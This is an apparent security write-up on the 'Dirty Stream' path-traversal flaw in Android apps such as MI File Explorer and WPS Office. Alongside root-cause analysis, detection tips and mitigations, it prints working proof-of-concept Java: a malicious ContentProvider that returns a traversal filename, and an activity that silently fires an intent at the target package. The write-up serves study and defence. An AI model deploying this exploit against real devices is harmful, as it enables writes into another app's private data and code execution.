Background — Android's IPC Trust Model

Android enforces strong process-level isolation through a Unix UID model backed by SELinux mandatory access controls. Each application runs in its own sandbox: its private data at /data/data/<pkg>/ is inaccessible to other apps by the kernel's file permission bits. This is the foundation that makes Android secure by default.

But apps need to talk. The Android IPC framework — Binder, Intents, and ContentProviders — was designed precisely to let applications exchange data without punching holes in the sandbox. ContentProvider is the key player here: it is an abstraction layer that exposes structured data or file handles to other apps in a controlled, declarative way.

How FileProvider is supposed to work

Sharing raw file paths via file:// URIs was deprecated in Android 7.0 (Nougat) because it leaked internal file system layout and bypassed permission checks. Its intended replacement, FileProvider, wraps files behind opaque content:// URIs. The server-side app declares shareable paths in a resource XML, and the runtime enforces that no URI can escape those declared roots.

When app A wants to send a file to app B, the typical flow looks like this:

A
Malicious app builds explicit Intent + content URI
→
startActivity() / startService() sends to target
B
Target calls openInputStream() + queries _display_name
→
Trusts the returned filename without validation
💣
Writes to attacker-controlled path inside target sandbox

The security of this model rests entirely on one implicit assumption: the consuming application must never trust the filename provided by the serving application. When that assumption is violated — as it was in Xiaomi's MI File Explorer and WPS Office — the entire sandbox collapses.

Root cause

When MI File Explorer receives a file share intent from another app, it performs a standard lookup to determine the local filename to cache the incoming data under. The code path roughly follows:

// Simplified representation of the vulnerable pattern in MI File Explorer
private String getFileName(Uri contentUri) {
    Cursor cursor = getContentResolver().query(
        contentUri,
        new String[] { OpenableColumns.DISPLAY_NAME },  // _display_name
        null, null, null
    );
    if (cursor != null && cursor.moveToFirst()) {
        return cursor.getString(0);  // ← ATTACKER CONTROLS THIS VALUE
    }
    return "downloaded_file";
}

// Downstream: the filename is used directly without any sanitization
File dest = new File(cacheDir, getFileName(uri));
copyStreamToFile(getContentResolver().openInputStream(uri), dest);

The critical flaw is on the last two lines. The value returned by _display_name is entirely under the control of the serving ContentProvider. If the serving app is malicious, it can return something like ../../shared_prefs/pwned.txt instead of a benign filename. Since new File(base, "../../../path") resolves dots at the filesystem level, the write lands wherever the attacker specifies — anywhere within the filesystem paths reachable by the target process.

⚠

Key insight: This is not a vulnerability in Android itself. ContentProvider is functioning exactly as designed. The flaw is that MI File Explorer implicitly trusts user-controlled metadata from an untrusted source — a classic confused deputy problem.

Why getLastPathSegment() doesn't save you

A common misunderstanding is that calling Uri.getLastPathSegment() on the content URI (rather than the cursor value) would be safe. It is not. An attacker can percent-encode the traversal sequences: %2F..%2F..%2Fshared_prefs%2Fevil.xml will decode to the path traversal after Uri.getLastPathSegment() processes it. The only safe fix is to canonicalize the resolved path and assert it starts with the intended base directory.

The MaliciousProvider class

The heart of the exploit is a custom ContentProvider subclass that overrides the query() method to return a weaponized filename in the _display_name column. When MI File Explorer calls getContentResolver().query() to discover the filename, it receives the traversal path instead of a legitimate name.

public class MaliciousProvider extends ContentProvider {

    private static final String TRAVERSAL_FILENAME =
        "../../shared_prefs/pwned.txt";  // path relative to target's cache dir

    @Override
    public Cursor query(Uri uri, String[] projection,
                         String selection, String[] selectionArgs,
                         String sortOrder) {

        // Return a MatrixCursor with a crafted _display_name value
        MatrixCursor cursor = new MatrixCursor(
            new String[] { OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE }
        );
        cursor.addRow(new Object[] { TRAVERSAL_FILENAME, 42 });
        return cursor;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) {
        // Return a file descriptor to the payload (pwned.txt)
        File payloadFile = new File(getContext().getFilesDir(), "pwned.txt");
        return ParcelFileDescriptor.open(payloadFile,
                   ParcelFileDescriptor.MODE_READ_ONLY);
    }

    // ... other required ContentProvider overrides (stub)
}

The MainActivity trigger

The MainActivity constructs an explicit Intent aimed at the file-receiving Activity or Service of MI File Explorer and attaches the malicious content URI as an extra. This fires without any user interaction beyond launching the exploit app — no permissions are requested, no dialogs appear.

public class MainActivity extends AppCompatActivity {

    // Target: MI File Explorer's file-handling component
    private static final String TARGET_PKG =
        "com.mi.android.globalFileexplorer";
    private static final String TARGET_ACTIVITY =
        "com.mi.android.globalFileexplorer.FileProcessActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri maliciousUri = Uri.parse(
            "content://com.example.dirtystream.provider/payload"
        );

        Intent exploit = new Intent();
        exploit.setClassName(TARGET_PKG, TARGET_ACTIVITY);
        exploit.setData(maliciousUri);
        exploit.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        startActivity(exploit);
        finish();  // Disappear immediately — no visible UI
    }
}
ℹ

The call to finish() immediately after startActivity() is a small but telling detail: the exploit app does not need to persist. Its job is simply to hand the baton to MI File Explorer and let the vulnerable code path do the rest. The user experience: you "open" the exploit APK, its Activity flickers for a frame, and then it closes. The payload has already been written.

AndroidManifest — exporting the weapon

For the rogue provider to serve data to MI File Explorer, it must be declared in the manifest with android:exported="true" and android:grantUriPermissions="true". This is the only entry that distinguishes a malicious app from a benign one at install time:

<provider
    android:name=".MaliciousProvider"
    android:authorities="com.example.dirtystream.provider"
    android:exported="true"
    android:grantUriPermissions="true" />

There is nothing unusual about this declaration. Thousands of legitimate apps have exported providers. Google Play's static analysis cannot distinguish a legitimately exported provider from a malicious one purely by manifest inspection — it requires runtime behavioral analysis.

Step-by-step breakdown

Step 1 — Delivery: The victim sideloads the exploit APK (or, in a realistic scenario, encounters it as a trojanized utility app on an unofficial app store). No special permissions are required during install.

Step 2 — Intent dispatch: On launch, MainActivity fires an explicit intent targeting MI File Explorer's file-handling component, attaching a content:// URI pointing to MaliciousProvider.

Step 3 — Provider query: MI File Explorer's file-receiving code calls ContentResolver.query() on the URI to retrieve the filename. The Binder IPC call crosses process boundaries and reaches MaliciousProvider.query() in the attacker's process.

Step 4 — Cursor poisoning: MaliciousProvider returns a MatrixCursor with _display_name = "../../shared_prefs/pwned.txt".

Step 5 — Path construction: MI File Explorer constructs the destination path as new File(cacheDir, "../../shared_prefs/pwned.txt"). The Java File constructor does not reject path traversal characters — it performs no canonicalization. The resulting path resolves to /data/user/0/com.mi.android.globalFileexplorer/shared_prefs/pwned.txt.

Step 6 — File write: The app opens an InputStream to the attacker's file and copies it to the resolved destination. The payload is now resident in the victim app's shared_prefs directory.

"The PoC writes a benign marker file, but the technique is identical whether the payload is a tampered SharedPreferences XML that disables security checks, a native library .so that gets System.loadLibrary()'d on next launch, or a database that injects SQL for privilege escalation within the target app's own logic."

Impact Assessment

The PoC demonstrates a write to shared_prefs/ — low impact in isolation, but the primitive generalizes dramatically. What an attacker can achieve depends entirely on what the target app loads from its own private storage:

Target path Payload type Impact
shared_prefs/*.xml Tampered preferences XML Disable security flags, change server endpoints, inject config values
lib/*.so Malicious native library Arbitrary code execution under target UID on next app launch
databases/*.db Pre-seeded SQLite database Corrupt or replace stored credentials, tokens, cached sensitive data
cache/*.dex Replacement Dalvik bytecode Arbitrary code execution if dynamic class loading is used
files/auth_token Overwrite token store Force re-authentication, enable session fixation, steal credentials on next sync

Microsoft's original research demonstrated the highest-impact variant: replacing the native library used by MI File Explorer's file cleaning feature. When the feature runs, the malicious library is loaded under the File Explorer's UID, achieving arbitrary code execution without any further user interaction.

⚠

Scale: MI File Explorer had over 1 billion installs on Google Play at disclosure time. WPS Office — also found vulnerable to the same class of bug — serves over 500 million Android users. The Dirty Stream pattern is not a one-off; Microsoft's research team identified it as a systemic vulnerability pattern present across many popular Android apps.

Detection & Forensics

Static indicators in the exploit APK

When analyzing an APK for Dirty Stream characteristics, look for the following patterns using tools like jadx, apktool, or MobSF:

// Red flag #1: ContentProvider with grantUriPermissions + exported
<provider
    android:exported="true"
    android:grantUriPermissions="true" ... />

// Red flag #2: MatrixCursor with path traversal strings
MatrixCursor c = new MatrixCursor(...);
c.addRow(new Object[] { "../../" + targetPath, ... });

// Red flag #3: Explicit intent to another app's internal component
intent.setClassName("com.mi.android.globalFileexplorer", internalActivity);
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

Runtime forensics on a compromised device

If you suspect a device has been targeted, check for unexpected files in sensitive directories of apps that handle file shares. With ADB and root access:

# Look for recently modified files in shared_prefs of file manager apps
adb shell "find /data/user/0/com.mi.android.globalFileexplorer \
    -newer /data/user/0/com.mi.android.globalFileexplorer/databases \
    -type f 2>/dev/null"

# Check for unexpected .txt / non-XML files in shared_prefs
adb shell "ls -la /data/user/0/com.mi.android.globalFileexplorer/shared_prefs/"

# Cross-reference with install date of suspicious APKs
adb shell pm list packages -f -i | grep -v com.google | grep -v com.android
✓

On non-rooted devices, an MDM solution (or Android's built-in Google Play Protect) is the most realistic detection surface. Play Protect's behavioral engine flags apps that fire explicit intents to other apps' internal components with content URIs shortly after install.

Mitigations

Mitigations fall into two categories: fixes for consuming applications (the vulnerable pattern) and defensive measures for end users and organizations.

DEV / 01
Canonicalize before write
Resolve the destination path with File.getCanonicalPath() and assert it starts with the intended base directory before any write operation.
DEV / 02
Generate your own filenames
Never use the provider-supplied filename for storage. Generate a UUID or use a content-addressed hash. The display name is for UI only.
DEV / 03
Strip traversal sequences
Sanitize _display_name by removing ../, ./, percent-encoded equivalents, and null bytes before any filesystem operation.
DEV / 04
Restrict provider exports
If your ContentProvider does not need to be accessible to arbitrary third-party apps, set android:exported="false" or protect it with a signature-level permission.
USER / 05
Update immediately
MI File Explorer patched this in versions after V1-210567. WPS Office patched in 17.0.0. Update both applications if installed.
USER / 06
Avoid unofficial APK sources
The exploit requires the victim to install the malicious APK. Restricting installs to Google Play (with Play Protect enabled) substantially raises the bar.

Conclusions & Broader Pattern

Dirty Stream is not simply a bug in MI File Explorer. It is the manifestation of a systemic design pattern problem in how Android apps handle inter-process file sharing. Microsoft's research team found the same flaw independently in WPS Office and anticipated — correctly — that it exists across many more applications in the ecosystem.

What makes this class of bug insidious is that it exploits correct use of the API in one app against a correct-but-incomplete implementation in another app. ContentProvider is not broken. FileProvider is not broken. The vulnerability lives in the gap between the server's documented contract (you should validate filenames) and the client's common implementation (most developers don't).

The cyb3r-w0lf PoC is an excellent piece of educational research for precisely this reason: it strips the exploit to its minimum viable form. There is no obfuscation, no multi-stage loader, no C2 infrastructure. It is two Java classes and a manifest entry — about 80 lines of code total — and it produces a reliable arbitrary write into the victim's private data directory on every invocation against the unpatched target.

Generalizing the pattern

Any Android application that:

1. Accepts files from other applications (share target, file opener, document processor), and

2. Uses the provider-supplied filename to determine where to cache or save the received content

...is potentially vulnerable to this class of attack. The Android Developers documentation now explicitly calls this out under Improperly trusting ContentProvider-provided filename (added in September 2024), and the Google Android lint rule UnsafeContentUriWithoutPermission flags some related misconfigurations at build time.

For security researchers, this PoC serves as a useful template for auditing share-target functionality across the broader Android app ecosystem — a large and still incompletely audited surface.
